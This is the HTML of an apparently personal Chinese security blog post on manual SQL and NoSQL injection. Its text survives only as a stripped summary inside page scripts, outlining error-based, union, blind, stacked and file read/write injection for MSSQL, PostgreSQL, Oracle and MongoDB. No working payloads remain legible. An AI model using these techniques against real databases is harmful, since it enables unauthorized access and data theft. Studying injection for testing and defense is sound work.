<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>sql注入学习--拓展 | hybcx</title><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="sql注入学习--拓展"><meta name="application-name" content="sql注入学习--拓展"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="sql注入学习--拓展"><meta property="og:url" content="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 前言 撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。 0x02 Msss"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 前言 撰写本篇的目的是为了进一步了解一下sql注入的其他类型，mssql、postgresql、db2等等，主要是认为了解且会用手工注入才是前提也是重点，不能完全利用工具。因此写下本文来记录常规的、常见的数据库类型的相关注入payload，让自己以后遇到的时候不会懵逼。 0x02 Msss"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2023/10/15/sql-zhu-ru-tuo-zhan/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: 'sql注入学习--拓展',
  postAI: '',
  pageFillDescription: '0x01 前言, 0x02 Msssql, 2.1 环境搭建, 2.2 自带库介绍, 2.3 信息搜集, 2.4 符号, 2.5 基本注入流程, 2.6 报错注入, 2.7 联合查询注入, 2.8 布尔盲注, 2.9 时间盲注, 0x03 PostgreSQL, 3.1 环境搭建, 3.2 验证注入, 3.3 报错注入, 3.4 时间盲注, 3.5  堆叠注入, 3.6 联合注入, 获取模式名称（schemaname）名称, 获取数据表名称, 获取表字段名称, 获取表内容, 3.7 文件或目录操作, 列目录——只能列安装目录下的文件, 读文件, 写文件, 0x04 Oracle, 4.1 基本概念, 4.2 基本语法, 4.3 信息搜集, 4.4 注入类型, 4.4.1 联合查询, 4.5 报错注入, 4.5.1 utl_inaddr.get_host_name, 4.5.2 , 4.5.3 CTXSYS.CTX_REPORT.TOKEN_TYPE, 4.5.4 XMLType, 4.5.6 dbms_xdb_version.checkin, 4.5.7 dbms_xdb_version.makeversioned, 4.5.8 dbms_xdb_version.uncheckout, 4.5.9 dbms_utility.sqlid_to_sqlhash, 4.5.10 ordsys.ord_dicom.getmappingxpath, 4.5.11 UTL_INADDR.get_host_name, 4.5.12 UTL_INADDR.get_host_address, 0x05 MongoDB, 5.1 NoSQL与MongoDB基本概念, 5.2 PHP操作MongoDB, 5.2.1 使用MongoDB类中相应的方法, 1. 创建集合, 2. 插入文档, 3. 查找文档, 4. 更新文档, 5. 删除文档, 5.2.2 使用execute()函数执行字符串, 5.3 PHP MongoDB注入攻击, 5.3.1 PHP数组注入/重言式注入, 5.3.2 execute()执行拼接字符串导致的注入/联合查询注入, 利用注释, 利用闭合, 0x06 总结, 0x07 参考文章, mssql参考, postgresql参考, Oracle参考, MongoDB参考前言撰写本篇的目的是为了进一步了解一下注入的其他类型等等主要是认为了解且会用手工注入才是前提也是重点不能完全利用工具因此写下本文来记录常规的常见的数据库类型的相关注入让自己以后遇到的时候不会懵逼环境搭建哎呀这一块看着真麻烦我本是想能实操就实操一下但这么麻烦感觉还是算了我初心只是想了解一下语句那就多用脑子想想吧下面都是跟着师傅学习的太强啦自带库介绍用于记录所有系统级别的信息这些信息用于控制用户数据库和数据操作为用户数据库提供的样板新的用户数据库都以数据库为基础由和使用记录着任务计划信息事件处理信息数据备份及恢复信息警告及异常信息它为临时表和其他临时工作提供了一个存储区其中最主要的是数据库其中存储了所有的数据库名等还有很多存储过程存储过程是一组为了完成特定功能的语句集它存储在数据库中一次编译后永久有效用户通过指定存储过程的名字并给出参数如果该存储过程带有参数来执行它实际上就是一个封装好的函数具有面向对象特点在数据库中有视图储存所有数据库名其他数据库的视图则储存他本库的表名与列名每一个库的视图表都有存储着所有的字段可编程性储存着我们的函数的存储过程天然支持多语句为我们的注入提供了遍历增删改查和数据库大同小异具体可以自行信息搜集先来了解下中有哪些角色权限以下摘自官网文档这里留着日后有需要在查看脑子里有个大概印象服务器级的固定角色描述固定服务器角色的成员可以在服务器上执行任何活动固定服务器角色的成员可以更改服务器范围的配置选项和关闭服务器固定服务器角色的成员可以管理登录名及其属性他们可以和服务器级权限他们还可以和数据库级权限如果他们具有数据库的访问权限此外他们还可以重置登录名的密码重要说明如果能够授予对数据库引擎的访问权限和配置用户权限安全管理员可以分配大多数服务器权限角色应视为与角色等效固定服务器角色的成员可以终止在实例中运行的进程固定服务器角色的成员可以使用语句添加和删除链接服务器使用时需要成员资格固定服务器角色的成员可以运行语句固定服务器角色用于管理磁盘文件固务器角色的成员可以创建更改删除和还原任何数据库每个登录名都属于服务器角色如果未向某个服务器主体授予或拒绝对某个安全对象的特定权限该用户将继承授予该对象的角色的权限只有在希望所有用户都能使用对象时才在对象上分配权限你无法更改具有角色的成员身份注意与其他角色的实现方式不同可通过固定服务器角色授予拒绝或调用权限固定数据库角色名描述固定数据库角色的成员可以执行数据库的所有配置和维护活动还可以删除中的数据库在数据库和数据仓库中某些维护活动需要服务器级别权限并且不能由执行固定数据库角色的成员可以仅修改自定义角色的角色成员资格创建无登录名的用户和管理权限向此角色中添加主体可能会导致意外的权限升级固定数据库角色的成员可以为登录名组和登录名添加或删除数据库访问权限固定数据库角色的成员可以备份数据库固定数据库角色的成员可以在数据库中运行任何数据定义语言命令固定数据库角色的成员可以在所有用户表中添加删除或更改数据固定数据库角色的成员可以从所有用户表中读取所有数据固定数据库角色的成员不能添加修改或删除数据库内用户表中的任何数据固定数据库角色的成员不能读取数据库内用户表中的任何数据我们可以用来判断服务器级别的固定角色返回值描述不是的成员是的成员或无效或者没有查看角色成员身份的权限构造语句数据库级别的应用角色用函数判断再来看一些基本信息版本用户当前数据库名你可以用来遍历出所有的数据库主机名那么站库分离可以这么来判断符号注释符空白符号暂时不了解为什么运算基本的不列举了举几个特殊的如果一组的比较都为则比较结果为如果两个布尔表达式都为则结果为如果其中一个表达式为则结果为如果一组的比较中任何一个为则结果为如果操作数在某个范围之内那么结果为如果子查询中包含了一些行那么结果为如果操作数等于表达式列表中的一个那么结果为如果操作数与某种模式相匹配那么结果为对任何其他布尔运算符的结果值取反如果两个布尔表达式中的任何一个为那么结果为如果在一组比较中有些比较为那么结果为基本注入流程此处利用数据类型不一样比较报错爆出当前数据库名在将值转换成数据类型时失败爆表名在将值转换成数据类型时失败此处可以是下列对象类型中的一种缩写全称约束默认值或约束约束日志标量函数内嵌表函数存储过程约束类型是复制筛选存储过程系统表表函数触发器用户表约束类型是视图扩展存储过程此处的等同于爆列名在将值转换成数据类型时失败在将值转换成数据类型时失败爆数据在将值转换成数据类型时失败当然在中也存在你也可以通过它来查询判断表名更方便的一种方式是使用选择列表中的列无效因为该列没有包含在聚合函数或子句中爆出一列将其用拼接进去继续往后爆其他的选择列表中的列无效因为该列没有包含在聚合函数或子句中选择列表中的列无效因为该列没有包含在聚合函数或子句中以此爆出所有字段报错注入其实基本注入流程中用到的就是报错注入中没有报错函数报错注入利用的就是显式或隐式的类型转换来报错先来看隐式报错和进行比较时就会报错再来看显示报错一般上显示报错用到的是和函数这里再来引入一个定义变量赋值执行联合查询注入不用数字占位因为可能会发生隐式转换我们用来占位因为数据库是个强类型的数据库对数据格式比较严格这里也是没搞懂发生隐式转换会如何我猜测是转换后无法查询我们想让其查询的语句了你也可以这样来联合报错布尔盲注布尔盲注没有那么多姿势大同小异截取字符串比较时间盲注是的延时语法同样可以用字符串截取来延时注入环境搭建这里比较建议用搭建如果不赶时间的话我这里也是懒得搭建了依旧是跟着文章走一遍验证注入运行正常运行异常报错注入这里也没去查猜测是函数将查询出的数据转换为了语句后面的数字型导致报错获取版本号获取名称时间盲注延时秒堆叠注入多语句查询联合注入运行正常运行异常获取字段数查看是否输出这里依旧是而不用数字占用获取数据库结构和内容此处均为联合查询获取模式名称名称语法解析函数返回参数列名中第一个非值的字段值注意不是为空转换为数字类型简化用户创建的数据库默认模式名称为获取数据表名称获取表字段名称获取表内容测列数测显位第错误正常正常错误获取信息获取数据库名获取表名获取列名获取数据文件或目录操作中部分内置函数表列目录只能列安装目录下的文件读文件这里是堆叠注入注意分号将要查询的数据放进了新建的表并最终读取写文件这里需要为数据库存在的表基本概念和数据库语法大致相同结构不太相同最大的一个特点就是可以调用代码对于数据库这个概念而言采用了表空间的定义数据文件就是由多个表空间组成的这些数据文件和相关文件形成一个完整的数据库当数据库创建时会默认创建五个表空间看名字就知道这个用于是存储系统表和管理配置等基本信息类似于主要存放一些系统附加信息以便减轻的空间负担用于事务回退等作为缓存空间减少内存负担就是存储我们定义的表和数据在中每个表空间中均存在一张表这个表是虚表并没有实际的存储意义它永远只存储一条数据因为的语法要求后必须跟上所以我们通常使用来作为计算查询时间等语句中之后的虚表占位也就是再来看中用户和权限划分中划分了许多用户权限权限的集合称为角色例如角色具有连接到数据库权限能进行基本的增删改查则集合了所有的用户权限在创建数据库时会默认启用等用户相当于下的用户为角色与类似但是相对于用户无法修改一些关键的系统数据这些数据维持着数据库的正常运行为角色代指所有用户对其操作会应用到所有用户上实际上是所有用户都有用户拥有的权限如果将权限给了那么也就意味着所有用户都有了权限基本语法要求后必须指明要查询的表名可以用使用拼接字符串中为或运算单引号和双引号在中虽然都是字符串但是双引号可以用来消除关键字比如中应该使用虚表中的字段通过条件判断中没有空字符和都是而中认为仍然是一个字符串对数据格式要求严格比如的时候放到下文讲的系统表系统里所有的表的信息需要权限才能查询当前用户有权限的表的信息当前用户名下的表的信息用户所拥有的或有访问权限的对象和表某一用户拥有的或有访问权限的对象和表某一用户所拥有的对象和表信息搜集从现在开始我们以注入点为例讲解代码随便写一个网页就行了获取数据库版本信息获取操作系统版本信息获取当前数据库获取数据库用户获取所有数据库用户需要高权限获取当前用户权限获取当前用户有权限的所有数据库获取表类似于中的里面的结构可以自己构造语句获取字段名在启动时在中存储了一些系统上下文信息通过函数我们可以取回相应的参数值包括当前用户名等等更多可用参数说明可以查阅提供的文档注入类型联合查询猜字段数量进行查询需要注意的是每一个字段都需要对应前面的数据类型字符串数字所以我们一般先使用字符占位然后逐位判断每个字段的类型比如正常正常说明第一个字段是数字型第二个字段为数字时错误正常为字符串依此类推查数据库版本和用户名查当前数据库查表等同于中的在和上已经抛弃可以用替代但是返回的是类型如果数据表很多会出现字符串长度过长的问题这个时候可以使用通过字符串截取来进行查字段有表名字段名出数据就不说了报错注入之后使用此函数的数据库用户需要有访问网络的权限处理文本的函数参数错误时会报错注意编码如果返回的数据有空格的话它会自动截断导致数据不完整这种情况下先转为再导出剩下的参考下面的链接吧这里只是做个记录与基本概念指的是非关系型的数据库有时也称作的缩写是对不同于传统的关系型数据库的数据库管理系统的统称用于超大规模数据的存储例如谷歌或每天为他们的用户收集万亿比特的数据这些类型的数据存储不需要固定的模式无需多余操作就可以横向扩展数据库分类类型部分代表特点列存储顾名思义是按列存储数据的最大的特点是方便存储结构化和半结构化数据方便做数据压缩对针对某一列或者某几列的查询有非常大的优势文档存储文档存储一般用类似的格式存储存储的内容是文档型的这样也就有机会对某些字段建立索引实现关系数据库的某些功能存储可以通过快速查询到其一般来说存储不管的格式照单全收包含了其他功能图存储图形关系的最佳存储使用传统关系数据库来解决的话性能低下而且设计使用不方便对象存储通过类似面向对象语言的语法操作数据库通过对象的方式存取数据数据库高效的存储数据并支持的内部查询语法比如属于数据库的一种是由语言编写的一个基于分布式文件存储的开源数据库系统旨在为应用提供可扩展的高性能数据存储解决方案在高负载的情况下添加更多的节点可以保证服务器性能将数据存储为一个文档数据结构由键值对组成文档类似于对象字段值可以包含其他文档数组及文档数组概念解析和关系型数据库的相关概念不一样在中基本的概念是文档集合数据库如下表术语概念术语概念解释说明数据库数据库表集合数据记录行文档数据字段域索引表连接不支持主键自动将字段设置为主键操作下操作大致分为两种方式对应有不同的注入攻击方式使用类中相应的方法使用的大致如下此时传递进入的参数是一个数组选择数据库选择集合增查减改确保连接及选择一个数据库为了确保正确连接你需要指定数据库名如果数据库在中不存在会自动创建示例代码如下访问页面会直接返回数据库名连接默认主机和端口为获取名称为的数据库创建集合创建集合的代码片段如下连接获取名称为的数据库集合创建成功在数据库中确认确实创建成功插入文档在中使用方法插入文档代码片段如下连接到选择一个数据库选择集合数据插入成功插入成功后到数据库中确认这里方法以格式化的方式来显示所有文档查找文档使用方法来读取集合中的文档代码片段如下连接到选择一个数据库选择集合迭代显示文档标题访问即可看到查询的标题更新文档使用方法来更新文档代码片段如下将标题内容从改为连接到选择一个数据库选择集合更新文档显示更新后的文档循环显示文档标题修改后显示改后的标题内容客户端确认是修改了删除文档使用方法来删除文档代码片段如下将移除为的一条数据记录连接到选择一个数据库选择集合移除文档显示可用文档数据访问之后即删除了为的文档在数据库中查不到集合的文档内容了使用函数执行字符串使用的大致如下此时传进方法的参数就是字符串变量特别的此时的字符串书写语法为的书写语法选择数据库增查减改注入攻击不同编程语言环境下的注入情景没啥差别这里主要对中实现的进行详细分析理解原理和场景就其他语言就大致给就好在此之前我们需要先初始化数据库赋给一些用户数据用于后面的使用这里随机添加个用户最后一个用户为公共用户大家都知道的连接到选择一个数据库选择集合添加成功用户添加成功访问触发一遍即可创建成功数组注入重言式注入一个数组绑定的查询代码如下连接到选择数据库选择集合未找到当我们用公共用户输入时显示出和分析一下这里我输入的是然后进入到中的语句其实为若此时我们以数组的形式输入源码中的值便为最后实际执行的语句为因此我们就可以利用这个特性往数组的键名传递一个操作符大于小于等于不等于等等从而达到利用的目的即不等于转换到语句即为而该语句相当于直接爆出了所有数据库用户信息执行拼接字符串导致的注入联合查询注入代码如下为了方便查看注入的语句我这里添加了输出查询语句未找到可以看到是直接拼接起来的字符串然后传入函数中执行正常访问添加个单引号试试发现会报错此时可以利用注释或闭合的方法针对性地实现注入就可以了利用注释按照输出的提示语句以及报错信息逐个尝试目的是成功注释掉后面的部分语句并返回成功当输入如下时成功返回这里返回和两项按照数据的格式我们可以让其返回键值对看看没问题剩下的就是各种尝试了爆数据库版本爆当前数据库所有集合这里因为返回的是数组需要用转换为字符串另外函数区分大小写爆其他集合第一条数据我这里本地新建集合并插入文档若想继续遍历爆其他信息只需修改数组下标即可往集合插入新用户数据利用闭合构造如下用于闭合后面的语句使语法正确剩下的其他利用和前面的一样这里只说个重点的在无回显的情况下我们就需要用到盲注技巧这里用到的盲注是基于时间的盲注在高版本下添加了函数我们利用这个函数和闭合的技巧来实现基于时间的盲注这种盲注技巧仅在闭合的情况下可行本人在注释的情况下并未成功若数据库版本大于则剩下的就是进阶的了可参考下面的总结本次文章呢旨在初步了解各种常用数据库的常规注入语句进阶的内容的很少但我心里认为还是有必要深度学习一下的不过我感觉学好的话也是很有帮助的剩下的可以遇到的时候百度什么的本文呢也只是简单总结一下我也不想啊太菜了遇到不会的知识以目前的我根本没能力写出高质量的文章也就是用自己的语言以及思考去写只得抄袭众多大佬的但希望这些知识可以变成自己的不论如何我都会努力提升自己在日后提升文章质量毕竟只有这样我认为才学的深刻吧本文也会一直更新难免实战遇到来更新一下加油参考文章参考注入与提权方法整理隐式类型转换注入学习笔记注入环境搭建渗透测试之基础篇手注之联合查询注入靶场实战参考参考注入参考注入学习含提权关于学习注入注入从零开始的注入学习实战注入总结参考注入之注入注入指北丨',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2023-12-18 17:12:22',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><div class="back-home-button"><i class="anzhiyufont anzhiyu-icon-grip-vertical"></i><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div></div><a id="site-name" href="/" accesskey="h"><div class="title">hybcx</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img 